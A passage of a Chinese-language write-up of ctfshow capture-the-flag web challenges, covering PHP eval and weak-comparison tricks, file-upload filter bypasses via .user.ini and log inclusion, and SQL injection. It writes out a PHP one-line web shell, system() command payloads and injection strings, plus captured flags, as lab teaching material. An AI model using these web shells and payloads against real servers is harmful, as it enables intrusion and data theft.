punctuation\">,</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>$allow是个数组，通过array_push将随机数添加到$allow中。\n$allow中必定存在一个数字0。\n然后这里利用in_array()的特性，弱比较特性，'0.php'==0。\nin_array延用了php中的==\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?n=1.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>post传参</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>content=<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>访问1.php</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a=system('tac flag36d.php');</pre></td></tr></table></figure><h2 id=\"web100\"><a class=\"anchor\" href=\"#web100\">#</a> web100</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-21 22:10:28</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ctfshow.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//flag in class ctfshow;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$v1</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$v2</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$v3</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$v0</span><span class=\"token operator\">=</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>('ctfshow')<span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>v1要为数字，v2是指令，v3必须含;\n\npayload:\n?v1=1&amp;v2=system('cat ctfshow.php')/*&amp;v3=*/;\n</code></pre>\n<h1 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h1>\n<h2 id=\"web151\"><a class=\"anchor\" href=\"#web151\">#</a> web151</h2>\n<p><strong>后端无验证</strong></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211151823184.png\" alt=\"image-20230211151823184\" /></p>\n<p>方法一：burpsuite 抓包改数据</p>\n<p>方法二：F12 直接改源码，因为校验格式写在 html 里</p>\n<pre><code>payload：\n访问url/upload/马\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;99531efd-02ea-410f-92a0-7d4e6a037b4a&#125;\n</code></pre>\n<h2 id=\"web152\"><a class=\"anchor\" href=\"#web152\">#</a> web152</h2>\n<p><strong>后端文件类型验证</strong></p>\n<p>后端不能单一校验</p>\n<p>后端校验要严密</p>\n<p>这一次不能直接在前端改代码</p>\n<p>&lt;文件上传失败，失败原因：文件类型不合规&gt;</p>\n<p>我们上传 png 马然后抓包再 burpsuite 里面改 php 即可绕过</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211160045055.png\" alt=\"image-20230211160045055\" /></p>\n<pre><code>payload：\n访问url/upload/马\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;0b8b4699-360f-4d06-976c-b26d21986107&#125;\n</code></pre>\n<h2 id=\"web153\"><a class=\"anchor\" href=\"#web153\">#</a> web153</h2>\n<p><strong>配置文件可控</strong></p>\n<p>后端校验要严密</p>\n<p>新知识 user.ini</p>\n<p>先将前端内容格式进行修改</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165314539.png\" alt=\"image-20230211165314539\" /></p>\n<p>然后上传 user.ini 文件</p>\n<pre><code>auto_append_file=1.txt\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165437254.png\" alt=\"image-20230211165437254\" /></p>\n<p>在 user.ini 前面加一个.</p>\n<p>再修改文件类型为 image/png 即可绕过上传成功</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165543326.png\" alt=\"image-20230211165543326\" /></p>\n<p>再编辑上传一个 1.txt 一句话木马，即可实现命令执行</p>\n<pre><code>payload：\n访问url/upload/马\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;f3e53e55-a523-417f-973c-0cb03629f560&#125;\n</code></pre>\n<h2 id=\"web154\"><a class=\"anchor\" href=\"#web154\">#</a> web154</h2>\n<p><strong>文件魔术字节欺骗</strong></p>\n<p>后端不能单二校验</p>\n<p>对 php 进行了过滤，新知识 php 短标签</p>\n<p>同样上传 user.ini</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211170837109.png\" alt=\"image-20230211170837109\" /></p>\n<pre><code>payload：\n访问url/upload/马\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;4cfa78ac-da71-4507-adb5-e0760adced07&#125;\n</code></pre>\n<h2 id=\"web155\"><a class=\"anchor\" href=\"#web155\">#</a> web155</h2>\n<p><strong>配置文件可控</strong></p>\n<p>后端不能单三校验</p>\n<p>同样对 php 进行过滤，也对文件类型进行判断，继续用短标签绕过即可</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214105947584.png\" alt=\"image-20230214105947584\" /></p>\n<pre><code>payload：\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;c161ced9-ccda-483f-8c8e-2795f038f0b3&#125;\n</code></pre>\n<h2 id=\"web156\"><a class=\"anchor\" href=\"#web156\">#</a> web156</h2>\n<p>后端不能单四校验</p>\n<p>文件内容检测 [] 过滤，{} 绕过即可</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214111055211.png\" alt=\"image-20230214111055211\" /></p>\n<pre><code>payload：\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;b74d2930-b4f8-4e42-9753-1a62cfa4a5f6&#125;\n</code></pre>\n<h2 id=\"web157\"><a class=\"anchor\" href=\"#web157\">#</a> web157</h2>\n<p>后端不能单五校验</p>\n<p>新知识，[] 和 {} 和；都被过滤了，这时用到 array_pop () 函数，分号可以省略</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214113617915.png\" alt=\"image-20230214113617915\" /></p>\n<pre><code>payload:\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;d474a4cf-72c0-4ba4-b675-6a39e9996ab5&#125;\n</code></pre>\n<h2 id=\"web158\"><a class=\"anchor\" href=\"#web158\">#</a> web158</h2>\n<p>后端不能单六校验</p>\n<p>过滤了日志包含</p>\n<p>同样能用上题方式解</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214113617915.png\" alt=\"image-20230214113617915\" /></p>\n<pre><code>payload:\na=system('tac ../flag.php');\n</code></pre>\n<pre><code>ctfshow&#123;f5e1cc4e-c6f8-4041-9978-b9f3d516e5cc&#125;\n</code></pre>\n<h2 id=\"web159\"><a class=\"anchor\" href=\"#web159\">#</a> web159</h2>\n<p>方法一：</p>\n<p>上传 user.ini</p>\n<p>用反引号绕过</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214120916212.png\" alt=\"image-20230214120916212\" /></p>\n<p>直接访问 upload 即可得到 flag</p>\n<p>方法二：</p>\n<p>日志包含漏洞绕过</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214122305098.png\" alt=\"image-20230214122305098\" /></p>\n<p>访问 upload 一次发现包含成功，然后 hackbar 日志文件包含漏洞，在 User Agent 输入一句话木马</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214160702690.png\" alt=\"image-20230214160702690\" /></p>\n<p>直接得出 flag（我这里没试出 flag，不知道是不是哪不对，但方法是没错的）</p>\n<p>#补充：之后搞明白了哪里不对，因为 upload 后面忘记加个斜线，导致网页在 upload 寻找一句话木马没找到所以报 301，加个斜线表示在下一个目录里，这样就对了</p>\n<pre><code>ctfshow&#123;b11deff1-c608-42de-ad9c-cfbc73b451c5&#125;\n</code></pre>\n<h2 id=\"web160\"><a class=\"anchor\" href=\"#web160\">#</a> web160</h2>\n<p>过滤了 php，执行函数，反引号，空格等</p>\n<p>同样日志包含漏洞即可</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144624269.png\" alt=\"image-20230214144624269\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144612304.png\" alt=\"image-20230214144612304\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144640074.png\" alt=\"image-20230214144640074\" /></p>\n<pre><code>ctfshow&#123;a2c7d477-51f5-401e-b249-3c863ba0ce91&#125;\n</code></pre>\n<h2 id=\"web161\"><a class=\"anchor\" href=\"#web161\">#</a> web161</h2>\n<p>同样的知识，这一次加了 GIF89a 文件头的判断</p>\n<p>用上一题的思路即可，这里我用蚁剑连接得到了 flag</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214160139556.png\" alt=\"image-20230214160139556\" /></p>\n<pre><code>ctfshow&#123;9a01b080-c26d-43c3-a15a-0e4070b40869&#125;\n</code></pre>\n<h2 id=\"web166\"><a class=\"anchor\" href=\"#web166\">#</a> web166</h2>\n<p>只允许 zip 上传</p>\n<pre><code>注意：有时候会出错，是因为 \n要改一下MIME类型：Content-Type: application/zip \n需要修改成：Content-Type: application/x-zip-compressed\n</code></pre>\n<h2 id=\"web168\"><a class=\"anchor\" href=\"#web168\">#</a> web168</h2>\n<p>基础免杀</p>\n<p>上传一个普通图片，发现他保存在本地目录了</p>\n<p>抓包</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214162516394.png\" alt=\"image-20230214162516394\" /></p>\n<pre><code>ctfshow&#123;78a76ccd-0c66-43f4-8498-ae629e44df88&#125;\n</code></pre>\n<h2 id=\"web169\"><a class=\"anchor\" href=\"#web169\">#</a> web169</h2>\n<p>高级免杀</p>\n<p>有点小坑，前端做了校验只能传 zip 文件，后端又做了图片文件检查.<br />\n 过滤了 <code>&lt;&gt;</code>  和 <code>php</code> , 可以上传配置文件绕过</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214180009668.png\" alt=\"image-20230214180009668\" /></p>\n<p>在文件头写个一句话木马</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214180035758.png\" alt=\"image-20230214180035758\" /></p>\n<p>然后蚁剑连或直接 rce (命令执行) 即可</p>\n<pre><code>ctfshow&#123;a2456e0d-217a-4514-8e13-d1a065544b01&#125;\n</code></pre>\n<h2 id=\"web170\"><a class=\"anchor\" href=\"#web170\">#</a> web170</h2>\n<p>终极免杀</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214181242486.png\" alt=\"image-20230214181242486\" /></p>\n<p>过滤了这么多，但是用上一题的方法同解</p>\n<pre><code>ctfshow&#123;28168a35-e410-412b-b906-1e49290460a5&#125;\n</code></pre>\n<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"web171\"><a class=\"anchor\" href=\"#web171\">#</a> web171</h2>\n<p>这里会把输入的 id 以 get 的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测 username 为为 flag 的用户他的信息就是我们所需要的，但是网页中 24 个用户并没有我们所需要的 flag，首先我们给前面一个查询语句一个不可能达成的条件去截断它，即 - 1'，然后用 or 加上我们所要查询的 or username = 'flag'. 我们语句外面还有一个引号。所以我们不要最后一个引号</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132457461.png\" alt=\"image-20230206132457461\" /></p>\n<pre><code>payload:\n-1' or username = 'flag\n\npayload2:\nid=1'or'1'='1\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132649276.png\" alt=\"image-20230206132649276\" /></p>\n<pre><code>ctfshow&#123;5680eb72-ef35-46b9-8c45-c504e6eb5e86&#125;\n</code></pre>\n<h2 id=\"web172\"><a class=\"anchor\" href=\"#web172\">#</a> web172</h2>\n<p>首先看到这个界面，老规矩，检查源代码，在底部发现 select.js</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132949239.png\" alt=\"image-20230206132949239\" /></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>layui<span class=\"token punctuation\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'table'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  var <span class=\"token keyword\">table</span> <span class=\"token operator\">=</span> layui<span class=\"token punctuation\">.</span><span class=\"token keyword\">table</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">table</span><span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span>&#123;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    elem: <span class=\"token string\">'#user'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">,</span>id:<span class=\"token string\">'user_table'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">,</span>title: <span class=\"token string\">'ç”¨æˆ·åˆ—è¡¨'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">,</span>height: <span class=\"token number\">500</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">,</span>page:<span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">,</span>url:<span class=\"token string\">\"api/\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">,</span>cols: <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      &#123;field: <span class=\"token string\">'id'</span><span class=\"token punctuation\">,</span> title: <span class=\"token string\">'ID'</span><span class=\"token punctuation\">,</span> sort: <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">fixed</span>: <span class=\"token string\">'left'</span>&#125;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">,</span>&#123;field: <span class=\"token string\">'username'</span><span class=\"token punctuation\">,</span> title: <span class=\"token string\">'ç”¨æˆ·å'</span>&#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">,</span>&#123;field: <span class=\"token string\">'password'</span><span class=\"token punctuation\">,</span> title: <span class=\"token string\">'å¯†ç '</span><span class=\"token punctuation\">,</span>edit:<span class=\"token string\">'text'</span>&#125;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  &#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">table</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">'toolbar(user-filter)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  var checkStatus <span class=\"token operator\">=</span> <span class=\"token keyword\">table</span><span class=\"token punctuation\">.</span>checkStatus<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  switch<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">'add'</span>:</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      layer<span class=\"token punctuation\">.</span>msg<span class=\"token punctuation\">(</span><span class=\"token string\">'æ·»åŠ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">'delete'</span>:</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      layer<span class=\"token punctuation\">.</span>msg<span class=\"token punctuation\">(</span><span class=\"token string\">'åˆ é™¤'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">'update'</span>:</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      layer<span class=\"token punctuation\">.</span>msg<span class=\"token punctuation\">(</span><span class=\"token string\">'æ›´æ–°'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  &#125;<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>layui<span class=\"token punctuation\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'element'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  var element <span class=\"token operator\">=</span> layui<span class=\"token punctuation\">.</span>element<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  element<span class=\"token punctuation\">.</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">'tab(nav)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    console<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  &#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>layui<span class=\"token punctuation\">.</span><span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'form'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  var form <span class=\"token operator\">=</span> layui<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  form<span class=\"token punctuation\">.</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">'submit(*)'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    var id <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">.</span>field<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    var <span class=\"token keyword\">table</span> <span class=\"token operator\">=</span> layui<span class=\"token punctuation\">.</span><span class=\"token keyword\">table</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">table</span><span class=\"token punctuation\">.</span>reload<span class=\"token punctuation\">(</span><span class=\"token string\">'user_table'</span><span class=\"token punctuation\">,</span> &#123;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      url:<span class=\"token string\">'api/?id='</span><span class=\"token operator\">+</span>id</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    &#125;<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//é˜»æ­¢è¡¨å•è·³è½¬ã€‚å¦‚æžœéœ€è¦è¡¨å•è·³è½¬ï¼ŒåŽ»æŽ‰è¿™æ®µå³å¯ã€‚</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  &#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>&#125;<span class=\"token punctuation\">)</span><span class=\"token 